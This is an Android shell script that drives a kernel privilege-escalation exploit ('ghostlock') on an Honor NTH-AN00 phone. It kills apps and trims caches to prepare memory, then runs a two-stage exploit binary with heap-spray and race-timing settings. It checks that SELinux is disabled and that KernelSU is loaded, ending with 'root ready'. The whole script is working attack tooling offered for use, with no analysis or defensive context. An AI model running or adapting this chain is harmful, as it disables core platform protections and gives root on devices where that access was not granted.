#!/system/bin/sh
# NTH-AN00 one-shot driver for the ghostlock-app shim.
# Runs the already-validated CLI exploit (memstart/KASLR probing inside).
cd /data/local/tmp || exit 1
LOG=/data/local/tmp/ghostlock_app.log
SYNC="GL_AIM_DM=1 GL_W1_ATTEMPTS=2 GL_ROUTE_ATTEMPTS=1 GL_HOLD_CHAIN=1 GL_HOLD_WAITER=1 GL_PUNCH_IN_WINDOW=1 GL_PUNCH_DELAY_USEC=0 GL_MCAST_ROUTE=1 GL_PROBE_BOOTID=0 GL_SPRAY_TEST=0 GL_STAMP_SYNC=1"

am force-stop com.hihonor.photos 2>/dev/null
am force-stop com.hihonor.searchservice 2>/dev/null
am kill-all 2>/dev/null
pm trim-caches 999999999999 2>/dev/null
sleep 60

: > "$LOG"
env $SYNC ./e --write1 >> "$LOG" 2>&1
if ! grep -q "SELinux DISABLED" "$LOG"; then
  echo "GHOSTLOCK_SHIM: write1 did not disable selinux" >> "$LOG"
  exit 2
fi

env $SYNC GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=0 ./e >> "$LOG" 2>&1
grep -q "KSU LOADED" "$LOG" || { echo "GHOSTLOCK_SHIM: ksu not loaded" >> "$LOG"; exit 3; }
echo "GHOSTLOCK_SHIM: root ready" >> "$LOG"
exit 0
